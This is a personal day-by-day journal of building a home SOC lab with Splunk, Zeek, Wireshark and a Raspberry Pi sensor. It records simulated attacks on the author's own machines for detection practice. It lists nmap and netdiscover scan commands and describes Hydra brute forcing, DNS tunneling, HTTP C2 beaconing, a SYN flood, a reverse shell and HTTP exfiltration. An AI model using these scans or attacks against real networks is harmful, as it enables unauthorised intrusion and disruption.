## 🚀 Day 0 — Cybersecurity.Start
 
 • Installed a clean Windows 10, then upgraded to Windows 11 to avoid compatibility issues.
 
 • Installed VirtualBox and added Ubuntu as the first virtual machine, followed by full updates.
 
 • Created additional Windows 10 VMs and resolved minor setup issues (e.g., disabling the floppy controller and deleting unnecessary system files).
 
 • Installed and updated Kali Linux without issues.

Later, I spent several days troubleshooting Ubuntu 24.04 while trying to install Wazuh and Splunk.
After multiple attempts, I successfully reinstalled Splunk on the new Ubuntu version, configured it, and verified it works properly.

 • Configured Windows (PowerShell + CMD) and Ubuntu (Terminal) for event forwarding into Splunk.

 • Created a shared folder between Windows and Ubuntu to exchange scripts, screenshots, and logs efficiently.


## 🧩 Day 1 — Checking Connectivity and Functionality

 • Verified all network connections and system communication.
 
 • Tested Windows → Ubuntu log forwarding using PowerShell event generation.

 • Identified an initial issue caused by antivirus interference, which blocked event forwarding.
 
 • ✅ Solved by adjusting antivirus rules and reconfiguring permissions.
 
 • Successfully sent 1, 10, and 100 events with different log levels: Error, Info, Warning.
 
 • Created a command reference text file containing essential maintenance and diagnostic commands for both Windows and Ubuntu, useful when working in Splunk.

## Day 3 - Splunk Installation Failure on Windows

I thought that everything works fine but when i started practice on sending events the splunk connection got broken and events stop coming on me host pc. So i decided to take anothere pc and install everything on more time but on clean windows 10.

Goal: Install Splunk Universal Forwarder on Windows and connect it to my Splunk Enterprise instance.
Result: ❌ Unsuccessful — encountered repeated MSI installer errors and permission issues.

Steps Taken
 1. Downloaded the official Splunk Universal Forwarder .msi from Splunk’s website.
 2. Tried to install normally → No “Run as administrator” button available.
 3. Attempted installation via Command Prompt and PowerShell with:

→ Result: “No se puede abrir este paquete de instalación…” error.

 4. Verified the MSI file was not corrupted.
 5. Checked permissions — account had administrator rights.
 6. Tried extracting MSI to TEMP and running from there → same error.
 7. Attempted to enable logging and check Windows Installer service — error 2203 and 1402, Rollback\Scripts key missing.
 8. Even on a brand new Windows PC the same MSI error appeared.
 9. Disabled antivirus and firewalls — still failed.
 10. After 8+ hours of troubleshooting (MSI repair, permissions, logs) → no progress.

Errors Encountered
 • Windows Installer Error 2203 & 1402 (permissions & missing registry keys).
 • “No se puede abrir este paquete de instalación…” despite valid MSI.
 • No Rollback\Scripts registry keys present.
 • Installation fails before any UI appears.

Resolution

💡 Switched to Linux. Installed Splunk Forwarder on Ubuntu in minutes using .tgz, configured forwarding to Splunk Enterprise, and started generating and analyzing events successfully.

Lessons Learned
 • Windows MSI installers can fail even on fresh systems, and debugging is often time-consuming.
 • Linux installation is much more transparent (untar + run commands).
 • Always have a backup platform (Ubuntu) to continue practicing if one system blocks progress.
 • Network and permissions issues are easier to debug on Linux with standard tools (tar, ss, nc, ping, etc.).

## Day 4 - Practice fully on Ubuntu

Today I set up my home lab but based on Linux to practice log ingestion, forwarding, and alerting in a fully offline environment. The lab consisted of:

 • Host machine: Ubuntu 24.04 VM running Splunk Enterprise
 
 • Secondary machine: Physical Ubuntu PC acting as a Splunk Universal Forwarder also 24.04

Key Steps Completed

 1. Clean Setup & Installation
 
 • Installed Splunk Universal Forwarder on Ubuntu2.
 
 • Configured forwarding to the host Splunk Enterprise instance.

 • Verified service status and active forwarders with splunk list forward-server.

 2. Log Ingestion Practice
 
 • Created custom log file /var/log/custom_test.log with multiple event types (INFO, WARN, ERROR) using bash loops.
 
 • Configured inputs.conf to monitor the custom log file and assigned index=main and sourcetype=custom_test.
 
 • Confirmed logs appeared in Splunk Web using searches like:

3. Forwarding & Connectivity Tests

 • Verified network connectivity between Ubuntu2 (forwarder) and host VM via ping and nc -vz <host_ip> 9997.
 
 • Observed forwarded events arriving correctly in the host Splunk instance.

4. Alerts & Testing
 
 • Practiced creating alerts on custom log events (INFO/WARN/ERROR).
 
 5. Lessons Learned
 
 • Linux permissions are crucial; most errors were caused by incorrect ownership or missing directories.

 • Forwarder configuration and network setup must match IPs and open ports.

 • Offline labs are fully functional for ingesting, searching, and alerting without needing internet.

## Day 7 - Splunk Log Monitoring & SOC Lab

Today I focused on building a hands-on log monitoring workflow using Splunk Enterprise and Splunk Forwarder. The main tasks completed were:
 1. Environment Setup: Verified connectivity between Ubuntu VMs, ensuring the forwarder sends logs to Splunk Enterprise successfully.
 2. Log Generation & Testing: Created synthetic logs including INFO, WARN, ERROR, and SSH failed login events. After starting the log generator, events were received in real time by Splunk.
 3. Live Event Dashboard: Built a SOC-style dashboard displaying event counts by type, top SSH attacker IPs, and recent events, with color-coded severity for easy visualization.
 4. Alerts Configuration: Set up real-time alerts for SSH failures, ERRORs, and WARNs, enabling immediate notification of anomalies.

Key Learnings:
 
• Handling unmatched events (NULL) and labeling them for better visualization.

• Creating real-time dashboards and alerts to simulate SOC monitoring.

• Practical experience with log generation, ingestion, and visualization in a controlled lab environment.

Next Steps: Extend the lab with correlation searches and more complex SOC scenarios for enhanced security monitoring practice.

## Day 8 - Splunk Lab: Real-Time Log Monitoring, Field Extraction, Dashboards & Alerts

Environment Setup
 
 • Host PC: Ubuntu with Splunk Enterprise
 
 • VM / Remote PC: Ubuntu with Splunk Universal Forwarder
 
 • Verified SSH connectivity between host and forwarder.
 
 • Splunk Forwarder installed and configured to send logs to Splunk Enterprise.

⸻

Log Preparation

 • Created a custom log file: /var/log/custom_test.log
 
 • Generated different log types:
 
 • INFO → normal events (e.g., User logged in, Page served)
 
 • WARN → warnings (e.g., Slow DB query, High memory usage)
 
 • ERROR → errors (e.g., Permission denied, Service crashed)
 
 • Simulated failed SSH login attempts with dynamic usernames, IPs, and ports.

 • Confirmed logs were ingested in real-time by Splunk after enabling the log generator.

⸻

Field Extraction

 • Used Field Extractor (rex) to extract:
 
 • username
 
 • src_ip
 
 • port
 
 • Verified fields appeared correctly in search results and in dashboard panels.
 
 • This allowed aggregation, visualization, and alerting.

⸻

Dashboard Creation
 
 • Created a new dashboard combining all extracted fields.
 
 • Panels included:
 
 • Top attacking IP addresses
 
 • Top targeted usernames
 
 • Recent failed login events
 
 • Set dashboard to refresh every 1 minute for real-time monitoring.
 
 • Tested PDF export functionality to practice report sharing.

⸻

Alerts
 
 • Created alerts for suspicious IPs based on thresholds (e.g., multiple failed logins).
 
 • Alerts were linked to extracted fields (src_ip) and could trigger notifications.

⸻

Observations
 
 • Real-time logs worked as expected 👍
 
 • NULL values appeared in some columns — caused by failed SSH login events, normal in this lab setup
 
 • Geolocation columns (Country/City) were empty because IPs were private lab addresses — expected behavior in a home lab
 
 • Dashboard visualization allowed quick identification of suspicious activity across multiple fields

 • DNS: 192.168.1.1

 • Connected host laptop via WiFi, PC2 via Ethernet.
 
 • Ensured PC3 is reachable via SSH from PC2.

 • Note: If the router is turned off or devices reconnect, dynamically assigned IPs (DHCP) may change unless static IPs are set on all machines or reserved in the router.
 
## 3. Splunk Forwarder Setup:

 • Installed Splunk Universal Forwarder on PC3.

 • Configured forwarder to send logs to the Splunk host (host laptop).
 
 • Verified connectivity and forwarding using nc and splunk list forward-server.
 
## 4. Testing & Monitoring:
 
 • Confirmed active forwarders on the Splunk host.
 
 • Tested sending logs from PC3 through SSH-managed terminals.
 
 • Verified that the host receives logs correctly.

## Challenges:
 
 • Initial confusion with IP addressing and Splunk session login.
 
 • Minor troubleshooting required for firewall and forwarder configuration.

## Key Takeaways:

 • Multi-device lab setup allows practicing realistic SOC workflows.

 • SSH access to servers enables headless management.
 
 • Splunk forwarders can be configured on multiple machines, sending logs to a central host for monitoring.

 • Static IPs are important for consistency in lab environments to prevent connection issues.

## Day 10 – Home Lab Practice (Splunk + Server Management)

## What I did today:

 ## 1. Server Management via SSH

 • Managed PC3 (server) from PC2 using SSH.
 
 • Opened two terminals simultaneously:

 • One for monitoring logs.

 • One for server management and configuration.

 • This setup made managing the server more convenient without needing to use the host laptop directly.

 ## 2. Log Forwarding & Monitoring
 
 • Confirmed that PC2 and PC3 are sending logs to the Host Laptop (running Splunk Enterprise).

 • Tested sending custom logs from PC3 using:

echo "Hello Splunk! $(date)" | sudo tee -a /tmp/test_splunk.log

• Verified logs appear in real-time on Splunk.

 ## 3. Live Log Generator
 
 • Started automatic log generation on PC2 and PC3 (server) to simulate real-time events.

 • Observed logs from both PCs flowing into Splunk dashboards.

 ## 4. Switch Configuration

 • Renamed the switch to a friendly name.

 • Verified port mapping:
 
 • Port 1 → Router

 • Port 2 → PC2
 
 • Port 3 → PC3 (Server)

 • Port 4 → Host Laptop

## Notes & Insights:
 • Host Laptop is mainly receiving logs; PC2 acts as the control terminal for server management.
 • Multiple SSH sessions make it easy to monitor and manage the server at the same time.
 • Lab environment is now fully functional with 3 computers + switch + router, ready for further practice and log experimentation.

## Day 15-17 - networking, automation, and observability

Date: October 28-30, 2025

Huge progress today across networking, automation, and observability in my home lab.

## ✅ What I accomplished

 • Proxmox & Networking

 • Installed and configured Kali on my Proxmox + UF + static ip
 
 • Installed and configured Windows 10 on my Proxmox + UF + static ip
 
 • Set static IP on my Proxmox Ubuntu VM (ens18) and verified persistence.

 • Integrated the new Supermicro Xeon server into my lab (router + TL-SG105E switch).
 
 • Splunk Forwarding

 • Installed Splunk Universal Forwarder on the Proxmox Ubuntu VM.

 • Configured inputs (syslog + custom file) and connected to my Splunk Enterprise indexer.

 • Deployed a log generator systemd service on the VM to simulate INFO/WARN/ERROR + SSH failed-login lines into /var/log/custom_test.log (ingested live into Splunk).

 • Raspberry Pi Network Sensor
 
 • Pi runs automatic packet captures and SCPs the newest .pcap to my Ubuntu host VM every 15 minutes.

 • Added cron heartbeats and logging; verified hands-off operation.

 
 • Ingested Pi sync logs into Splunk for visibility (source=/home/user/pi_sync.log).

 • Dashboards & Alerts

 • Built Splunk dashboards for syslog + simulated app logs (username, src_ip, port extractions).

 • Added alert: >2 failed SSH passwords within 5 minutes.

## 🔧 Key commands/config (high level)

 • UF install on VM: extract → /opt/splunkforwarder/bin/splunk enable boot-start → set outputs to indexer → add monitors.

 • VM log generator: systemd service writing to /var/log/custom_test.log at random intervals.

 • Pi automation: /usr/local/bin/autocapture.sh + sync_latest_capture.sh via cron (*/15 * * * *), SSH keys for passwordless copy, cleanup (find … -mtime +3 -delete).

## 📈 Results

 • End-to-end pipeline now continuous and automated:

 • VM → Splunk (UF) ✅
 
 • Pi → Host VM (SCP) → Wireshark + Splunk log of sync events ✅

 • Real-time visibility verified in Splunk dashboards; alerts firing as expected.

## ⏱️ Study time

~6 hours (plus troubleshooting)

## 🧠 Reflection

Today I connected all moving parts into a cohesive monitoring stack. I’m much more comfortable with netplan/static IPs, systemd services, cron, UF configuration, and Splunk field extraction/alerts. The lab now feels like a mini SOC where I can iterate faster on real data.

## Day 20 - New day in my Cybersecurity Lab   
Date: Date: November 4, 2025  

Topic: Network Scanning & ARP Analysis

Environment:  
- Kali Linux (Attacker / Scanner)  
- Raspberry Pi (Sniffer running `tcpdump`)  
- Windows / Proxmox host network (.50 target)  
- Wireshark for analysis  



## 🎯 Objective
Simulate and analyze basic network reconnaissance techniques in a safe home lab.  
Today’s focus: detecting ARP sweeps and understanding how they appear in packet captures.



## 🧩 Tasks Performed

### 1. Raspberry Pi Packet Capture Setup
Configured tcpdump for rotating captures:sudo tcpdump -i eth0 -s 0 -U -n \
  -w "/home/admin/captures/test_$(date +%Y%m%d_%H%M%S).pcap" \
  -G 60 -W 60 'tcp[tcpflags] & tcp-syn != 0 or arp'
- Verified continuous rotation of .pcap files
- Confirmed correct timestamps and active interface  
- Checked disk usage and file sizes


### 2. Network Scanning from Kali
Performed local subnet discovery:sudo netdiscover -r 192.168.1.0/24
Observed typical ARP sweep behavior:
- Sequential Who has 192.168.1.x? Tell 192.168.1.125
- Source: Kali VM / Proxmox interface
- Dozens of ARP requests per second



### 3. Wireshark Analysis
Filter used:arp && eth.src == <scanner_mac>
Identified patterns:
- Source repeatedly probing IP range  
- Requests: “Who has 192.168.1.117 … 192.168.1.148”
- Confirms active host discovery  
- Recognized the difference between normal ARP cache traffic vs scanning bursts  


## 🧠 Key Learnings
- How ARP scanning appears in packet captures  
- Difference between broadcast and directed ARP traffic  
- Practical use of tcpdump filters for continuous network monitoring  
- Recognizing scanning behavior from timing and sequence patterns  



## 🧰 Tools Used
| Tool | Purpose |
|------|----------|
| tcpdump | Network capture on Raspberry Pi |
| Wireshark | Deep packet inspection |
| netdiscover | ARP-based host discovery |
| nmap *(planned next)* | TCP SYN & port scanning |


## ✅ Next Steps
- Simulate TCP SYN scan with nmap -sS 192.168.1.50 -p 1-1024  
- Capture and analyze SYN flood patterns  
- Compare ARP sweep vs TCP scan signatures

## Day 21 — Network Scanning & Troubleshooting Lab  

Date: November 5, 2025
  

## 🔧 Summary
Today’s session focused on end-to-end troubleshooting of my home lab connectivity, followed by network discovery, scanning, and traffic capture analysis.  
I confirmed my monitoring setup works correctly and successfully identified SYN scan and ARP broadcast patterns in Wireshark.

---

## 🧠 Main Activities
1. Troubleshooting network and repeater issue  
   - Server lost Internet connectivity (no ping to 8.8.8.8).  
   - Diagnosed issue using ip a, ip route, and ethtool.  
   - Found problem in my Wi-Fi repeater not passing wired traffic.  
   - Reset repeater → restored connectivity and verified with ping test.  

2. Verifying lab systems  
   - Started Proxmox server, Kali attacker VM, Raspberry Pi capture node, and Windows host.  
   - Checked communication between devices — confirmed all reachable via ping.  

3. Network discovery and scanning  
   Executed from Kali:  
   sudo netdiscover -r 192.168.1.0/24
   sudo nmap -sn 192.168.1.0/24
   nmap -sS -p 1-100 192.168.1.10
   sudo nmap -sV 192.168.1.50
     
   - Observed host discovery packets (ARP + ICMP).  
   - Detected SYN packets from my Kali to multiple hosts.  

4. Packet capture on Raspberry Pi  
   - Manual capture command:  
         sudo tcpdump -i eth0 -w "/home/admin/captures/test_$(date +%Y%m%d_%H%M%S).pcap" -G 60 -W 1
       
   - Transferred PCAPs to host using:  
         scp /home/admin/captures/*.pcap user@host:/path/to/store/
       

5. Wireshark analysis  
   - Opened captures from Pi and analyzed them using display filters:  
         tcp.flags.syn == 1 && tcp.flags.ack == 0
     tcp.flags.reset == 1
     icmp.type == 3
     arp.opcode == 1
       
   - Identified SYN scan activity and ARP broadcasts consistent with host discovery tools.  
   - Verified port scanning pattern from 192.168.1.125 (Kali) to 192.168.1.10, .12, .50.  
   - Observed RST,ACK replies → confirmed closed ports.  
   - Captured ICMP “Destination Unreachable” messages from the gateway during scanning.  


## 📁 Artifacts Collected
- PCAPs:  
  - scan_test2.pcap  
  - scan_test3.pcap  
  - auto_20250909_*.pcap  
- Screenshots:  
  - ARP flood sequence (`Who has 192.168.1.x Tell 192.168.1.1`).  
  - SYN/RST exchange pattern.  
  - ICMP unreachable alerts.  
  - Server interface outputs (`ip a`, ethtool, `ip route`).  

## 🧩 Interpretation
- Network discovery: Repeated ARP requests indicate local subnet enumeration.  
- SYN activity: High rate of SYNs from Kali shows active scanning (reconnaissance).  
- RST/ACK patterns: Closed ports on scanned hosts respond immediately.  
- Connectivity fix: Restoring repeater functionality returned full routing to the Internet.  


## 🧰 Useful Commands

# Show link state of all interfaces
ip a

# Display routing table
ip route

# Check if Ethernet link is detected
sudo ethtool eno2 | grep "Link detected"

# Start capture (rotate every 60s, 1 file)
sudo tcpdump -i eth0 -w "/home/admin/captures/test_$(date +%Y%m%d_%H%M%S).pcap" -G 60 -W 1

# Quick copy of captures to host
scp /home/admin/captures/*.pcap user@192.168.1.:/captures/


## 🧠 Lessons Learned
- Always verify physical links and repeater/switches first during connectivity issues.  
- Using Wireshark filters effectively narrows analysis to useful packets.  
- SYN scan behavior can be visually confirmed via RST/ACK sequences.  
- ARP bursts are normal during scanning but can flood the network under heavy discovery.  


## 🚀 Next Steps
1. Reproduce today’s scan and build a Suricata rule to detect multiple SYNs per second.  
2. Extend capture automation on Raspberry Pi with cron + rotation.  
3. Document a new lab for brute-force login detection using Hydra and Wireshark.  
4. Start preparing visual report templates for GitHub (screenshots + PCAP metadata).

## Day 26 — Network Traffic Analysis: DNS Tunneling, Port Scanning & C2 Investigation

Date: November 12, 2025

## Summary:
Today I focused on analyzing previously captured network traffic (pcap files) from my isolated SOC home lab. My goal was to identify different attacker behaviors that I executed earlier from my Kali machine and verify how they appear in Wireshark. I also checked why DNS tunneling traffic started failing and why the ICMP “Destination Unreachable” messages appeared.

## 🔍 1. DNS Tunneling Traffic Review

I analyzed the DNS packets generated during the iodine DNS tunneling test.
Findings:
 • Multiple DNS queries contained the same structure used by iodine, including:
 • Long encoded subdomain labels
 • Repetitive query patterns
 • High-frequency queries
 • Several responses were labeled as:
 • Unknown operation
 • Malformed Packet
 • This is expected when DNS tunneling tools encode data into DNS payloads.

## Observation:
Later in the capture, DNS queries suddenly triggered ICMP Type 3 Code 3: Port Unreachable from the target (192.168.1.125).
This means:
 • The DNS server port (UDP 53) stopped responding
 • or DNS listener closed
 • or iodine server side wasn’t running anymore

This explains why tunneling worked earlier but stopped afterwards.

## 🕵️ 2. Brute Force & Port Scanning Visibility

In another section of the capture, I reviewed:

✔️ Brute Force Attempts
 • Traffic targeting SSH service
 • Repeated and sequential login attempts from my Kali machine
 • Clear pattern of automated authentication failures
 • Matches expectations of a dictionary attack

✔️ Port Scan Traffic

Large number of SYN packets from 192.168.1.125 → 192.168.1.80 and other hosts:
 • SYN sweeping across hundreds of ports
 • No 3-way handshake (classic Nmap scan)
 • Very fast sequence timestamps → automated reconnaissance
 • Visible payload sizes (66 bytes) consistent with SYN packets


## 🌐 3. ARP Activity & Network Enumeration

I also analyzed ARP-related traffic:
 • Massive list of “Who has IP → Tell 192.168.1.125” messages
 • Even some messages showing “duplicate use of 192.168.1.1 detected!”
 • This happens during ARP scanning (ARP sweep)

This confirms that ARP-based host discovery works and is fully visible in the mirrored capture.

## 🧭 4. C2 (Command & Control) Investigation

I began checking how simulated C2 traffic appears:
 • The HTTP section of the capture showed many HTTP 303 See Other redirects
 • Interesting outbound HTTP requests from 192.168.1.69 (victim) to external-looking IP 4.3.2.1
 • This traffic is likely from the C2 simulation test I started

## 📌 Overall Conclusion

Yesterday’s traffic review successfully confirmed visibility of:
 • ✔️ DNS tunneling
 • ✔️ Brute force patterns
 • ✔️ TCP SYN port scans
 • ✔️ ARP sweeping
 • ✔️ HTTP traffic useful for C2 simulation

## Next steps:
 1. Build Splunk detection logic for DNS tunneling + brute force
 2. Continue HTTP-based C2 simulation
 3. Compare results in Wireshark vs. Splunk dashboards


## Day - 27 Home Lab – Network Attack Simulation & Traffic Analysis 

Date: Noviembre 13, 2025 

Today I conducted four different offensive techniques in my isolated SOC home lab and captured all traffic using my Raspberry Pi (monitoring port-mirrored traffic via tp-link switch). My attacker was Kali Linux, the victim was Ubuntu, and all results were analyzed later in Wireshark.

## 1️⃣ Port Scanning

I performed a wide TCP SYN scan from Kali (192.168.1.125) against the victim Ubuntu machine (192.168.1.50).
Result in Wireshark:
 • Clear SYN flood patterns
 • Ports responding with RST or SYN/ACK
 • Many red packets → port closed
 • Normal behavior for Nmap SYN scan

This confirmed visibility of reconnaissance activity.

## 2️⃣ Brute-Force Attack

I simulated SSH brute force login attempts from Kali to the victim using Hydra.
Result in Wireshark:
 • High volume of SSH2 “Key Exchange Init”
 • Repeated encrypted packets
 • Login failures visible in /var/log/auth.log (Splunk indexed them)

This successfully created brute-force artifacts for SIEM detection.

## 3️⃣ DNS Tunneling

I simulated exfiltration-like DNS tunneling by sending a file from the victim to Kali’s DNS server.

Result in Wireshark:
 • Long, unusual DNS queries
 • Random-looking subdomains
 • “Malformed Packet” alerts
 • NXDOMAIN and unusual query sizes

Exactly the kind of strange DNS activity analysts detect when spotting tunneling.

## 4️⃣ HTTP C2 Beacon

I deployed a very simple custom HTTP Command & Control setup:
 • Kali runs the C2 python server
 • Ubuntu runs a beacon loop that checks for commands every 10 seconds

Result in Wireshark:
 • Clean HTTP GET → POST pattern
 • Text/plain commands
 • Visible heartbeat beaconing behavior
 • Easy to identify periodic callback traffic

This created realistic C2-like behavior for SOC investigations.


## Final Notes

All traffic was captured via my Raspberry Pi sniffer, stored as .pcap files, and analyzed in Wireshark.
This session helped me understand how each attack type looks at the packet level and prepares me to build Splunk detections for recon, brute-force, DNS tunneling, and C2 activities.

## Day 28  — Zeek + Splunk Integration Day

Date: November 14, 2025

Today’s session was fully focused on integrating Zeek network monitoring with Splunk Enterprise inside my isolated SOC home lab. This was one of the most complex and technical days so far, involving troubleshooting, configuration, log ingestion tuning, and validation.

## 🔧 1. Zeek Installation & Troubleshooting on Raspberry Pi
 • Installed Zeek manually on Raspberry Pi 4B (8GB).
 • Fixed multiple issues related to:
 • zeekctl not starting
 • missing state.db
 • wrong permissions on /usr/local/zeek/logs/current
 • Created missing log directories and applied correct ownership/permissions.
 • Successfully ran Zeek in standalone mode:

Verified packet capture by generating ICMP traffic (ping tests).


## 📁 2. Zeek Log Generation Validation

After fixing the file structure and permissions, Zeek finally started generating logs:
 • conn.log
 • dns.log
 • http.log
 • weird.log
 • packet_filter.log
 • telemetry.log
 • and others…

These files appeared correctly inside:

This confirmed that Zeek was processing real traffic on the mirrored network port.


## 🔗 3. Splunk Universal Forwarder on Raspberry Pi
 • Verified that the Splunk Forwarder was running and connected to my Splunk indexer:

• Cleaned the configuration so only valid monitored files remained.
 • Added Zeek log directory to Forwarder monitoring:

 • Confirmed that Splunk Forwarder recognizes the monitored log paths.


## 📊 4. Zeek Logs Successfully Ingested Into Splunk

Finally, confirmed in Splunk Web that Zeek logs were arriving:

Received:
 • DNS events
 • Connection events
 • Telemetry events
 • Other Zeek logs

This proves the entire data pipeline from Raspberry Pi → Zeek → Splunk Forwarder → Splunk Indexer → Search was working.


## 🎯 5. End of Day Results

Today I achieved one of the biggest milestones in my SOC home lab:

✔️ Zeek fully functional on Raspberry Pi
✔️ Real-time packet analysis working
✔️ Splunk Forwarder correctly configured
✔️ Zeek logs forwarded into Splunk in real time
✔️ Validated multiple log sources (DNS, conn, telemetry, etc.)
✔️ Prepared to build Zeek dashboards and detections

This setup now allows me to perform:
 • Network forensics
 • Threat hunting
 • C2 traffic detection
 • DNS tunneling detection
 • HTTP anomaly analysis
 • And full packet-behavior investigation

A huge upgrade for my SOC learning environment.

### Day 29 — lab session
Date: November 15, 2025

## Summary:  
Today I focused on integrating Zeek on the Raspberry Pi with my Splunk indexer. I got Zeek running on eth0, added the Zeek log folder to the Splunk Universal Forwarder, and verified Zeek logs (conn, dns, http, telemetry, weird) are indexed in Splunk. I also simulated a few attacks (DNS-based exfil patterns and TCP/SSH scans) and verified they appear in both Zeek logs and Splunk searches.

## Issues / notes:
- Pi time was behind (NTP not reachable in offline lab). Fixed by enabling NTP (when network available) or manually setting clock.
- NIC checksum offloading triggers Zeek warnings; acceptable for now (can run zeek -C or disable offload to remove warnings).

## Next: add more monitors, run iodine DNS-tunnel and HTTP C2 simulations, build a Splunk dashboard for Zeek detections.


## Day 30 - Zeek + Splunk + Wireshark + Attacks Day
Date: November 17, 2025

Today I focused on expanding the detection capabilities of my SOC Home Lab by integrating Zeek logs with Splunk dashboards and analyzing several simulated attacks from my Kali machine. This session included four offensive techniques, full packet captures, filtering logic in Splunk, MITRE ATT&CK tagging, and even a DoS traffic stress test.

## 1. Zeek Log Integration & Troubleshooting

 • Continued testing Zeek’s full log coverage (conn.log, dns.log, ssh.log, http.log).
 
 • Identified an issue with Splunk searches returning no results — root cause was low disk space (the Raspberry Pi auto-uploaded ~23 GB of PCAPs).
 
 • After cleanup, Splunk resumed indexing normally.
 
 • Verified that all Zeek sources were correctly forwarded from the Raspberry Pi to the Splunk indexer.

## 2. Built and Improved Splunk Dashboards

Created four MITRE ATT&CK-tagged dashboards, each representing one adversary technique:
 
 • T1110.001 – SSH Brute Force (Hydra)
 
 • T1071.004 – DNS Tunneling (iodine)
 
 • T1071.001 – HTTP C2 (beaconing)
 
 • T1046 – Network Scanning (Nmap)

## Improvements:
 
 • Added custom SPL searches for each dataset.
 
 • Added MITRE ATT&CK tags to dashboard names and descriptions.
 
 • Tuned time ranges, event panels, and timeline visualizations.
 
 • Verified that each dashboard reacts in real time during offensive activity.

## 3. SSH Brute Force (Hydra) Visibility
 
 • Ran Hydra brute force from Kali on port 22 against PC2 (192.168.1.50).
 
 • Observed:
 
 • Rapid failed login attempts.
 
 • libssh handshake fingerprints.
 
 • Short session durations.
 
 • Characteristic connection patterns from a brute-force tool.
 
 • Splunk dashboard correctly detected the attack based on:
 
 • High frequency of SSH attempts.
 
 • Repetitive destination port 22.

 • Multiple authentication failures.

## 4. DNS Tunneling Simulation (iodine)
 
 • Started iodine server on PC2 and client on Kali.
 
 • Successfully established a tunnel using exfile.lab.
 
 • Observations:
 
 • Zeek detected strange DNS labels and encoded subdomains.
 
 • Queries marked as unknown or NXDOMAIN.
 
 • Continuous traffic over udp/53.
 
 • Long, suspicious domain names (e.g. yrbcel…exfile.lab).
 
 • Splunk dashboard matched behavior of MITRE T1071.004 DNS data exfiltration.

## 5. HTTP Command & Control (C2 Beaconing)

Simulated a very simple HTTP C2 channel:

• Used the C2 channel to send commands such as whoami, hey and ls.
 
 • Zeek captured:
 
 • /beacon endpoint requests.
 
 • User-Agent "Mozilla/5.0 (C2Client)".
 
 • HTTP 200 OK responses.
 
 • Continuous polling every 2 seconds.
 
 • Wireshark confirmed plaintext command return data (e.g., heythere, whoami).
 
 • Splunk dashboard clearly visualized periodic beaconing, matching T1071.001 HTTP C2.

## 6. Network Scanning Detection (Nmap)
 
 • Performed TCP SYN scans from Kali.
 
 • Zeek detected:
 
 • Large amounts of SYN packets.
 
 • Ports marked with unusual states like OTH and REJ.
 
 • Massive spikes in connection attempts within seconds.

 • Splunk visualization produced clear spikes corresponding to the scan window.

## 7. DoS / SYN Flood Stress Test
 
 • Simulated a flood using hping3:

Results:

 • VM temporarily froze due to traffic volume (expected).
 
 • Wireshark captured:
 
 • Extreme packet rate (4.4 million packets in a short time).
 
 • Repeated RST,ACK patterns.
 
 • Port-number reuse warnings.

 • Zeek logs showed overwhelming flow attempts even though the target couldn’t respond.
 
 • Demonstrated how easily low-resource machines can be overwhelmed.

## 8. Packet Analysis in Wireshark

 • Imported pcap files generated by Zeek.
 
 • Used display filters:
 
 • ip.addr == 192.168.1.50
 
 • http && ip.addr == 192.168.1.50
 
 • Observed:

 • Beacon commands and responses (hey, whoami).
 
 • HTTP 200 OK with text/plain.
 
 • SYN flood signature in bright red blocks.
 
 • DNS tunneling encoded hostname strings.

## 9. Summary & Findings

## Today I completed my first full multi-technique detection workflow using:
 • Zeek → Splunk → Dashboarding → MITRE mapping → Wireshark validation

I demonstrated visibility into:
 • Brute force authentication abuse
 • DNS tunneling / exfiltration
 • HTTP C2 beaconing
 • TCP scanning
 • SYN flood / DoS behavior

Each of these techniques now has:
 • Logs ✔️
 • Splunk detections ✔️
 • Dashboards ✔️
 • MITRE mappings ✔️
 • PCAP evidence ✔️

## Day 31 - Purple-Team Attack Chain (Second Run)
Date: November 18, 2025

Today I completed the entire purple-team attack chain again inside my offline SOC Home Lab. The goal was to simulate a realistic, multi-stage intrusion and observe every phase with my Raspberry Pi packet-capture sensor and Wireshark.

## 1. Initial Foothold (Reverse Shell)

I established a reverse shell from the victim machine (192.168.1.50) to my Kali box (192.168.1.125).
In Wireshark I could clearly see:

 • The TCP handshake on port 4444
 
 • The interactive shell traffic

 • All commands I typed (whoami, hostname, ip a, etc.) reconstructed inside the TCP stream

This once again showed how obvious reverse shells look in packet captures.


## 2. Privilege Escalation Attempts

Inside the shell I tested basic escalation steps (sudo checks, system info, etc.).
The victim blocked escalation as expected, but Wireshark captured everything — a nice reminder of how much attacker activity leaks into the network layer even during local commands.


## 3. Internal Recon & Lateral Movement

From the compromised host I explored the internal network:

 • ICMP sweeps to 192.168.1.133 and 192.168.1.123

 • Manual TCP port checks (SYN packets easily visible in Wireshark)
 
 • SSH attempts toward 192.168.1.133

Wireshark showed all of it: echo requests, unreachable replies, open port responses, and failed SSH connections.
Even without Zeek, these phases were extremely obvious.


## 4. Data Exfiltration via HTTP

I generated a random binary file on the victim and transferred it to the attacker using a simple Python HTTP server.

Wireshark captured:

 • The full HTTP request

 • The file upload

 • A complete reassembly of the binary payload

 • Several hundred KB of exfiltrated data

 • Clean visual separation between reverse shell, recon, and exfil stages

This step easily confirmed how visible clear-text exfiltration is on a monitored network.


## 5. Full Attack Chain PCAP

All stages ended up inside a single file: attackchainFULL.pcap

It contains:
 
 • Reverse shell traffic
 
 • Privilege escalation attempts

 • ICMP scanning

 • TCP scanning
 
 • Lateral movement
 
 • HTTP exfiltration

 • Previous beacon traffic

It’s a perfect multi-stage intrusion capture for future Splunk tests and detection rule practice.


## 6. Splunk / Zeek Note

During the morning run, Zeek successfully generated logs and Splunk showed:
 
 • Reverse shell connections

 • Port 4444 activity
 
 • HTTP traffic for exfiltration
 
 • Known services

 • Beaconing patterns

During the afternoon run, Zeek was not running, so Splunk missed the entire chain.
This was a great reminder: always check Zeek status before running attacks.


## 7. What I Learned Today
 
 • A full attack chain is much easier to read when all phases are in one PCAP.
 
 • Reverse shells are extremely easy to spot in raw traffic.
 
 • Manual recon (ICMP + TCP) produces very recognizable patterns.

 • Simple HTTP servers can still be used for exfiltration, and the traffic is crystal clear.
 
 • Zeek is essential for SOC visibility; without it, Splunk sees nothing.
 
 • My lab simulations are becoming more structured and realistic each day.

## 8. Next Steps
 
 • Repeat the full chain with Zeek enabled to capture everything into Splunk.
 
 • Build Splunk dashboards for recon, reverse shells, and exfiltration.

 • Create detection logic for beaconing behavior.
 
 • Try a more stealthy exfiltration method (base64, chunked uploads, etc.).

 • Add automation to verify Zeek status before attack simulations.


## 🔥 Final Thoughts

Today I completed the cleanest, most structured purple-team simulation I’ve done so far.
Raspberry Pi capture + Wireshark analysis gave me full visibility of every attack phase.

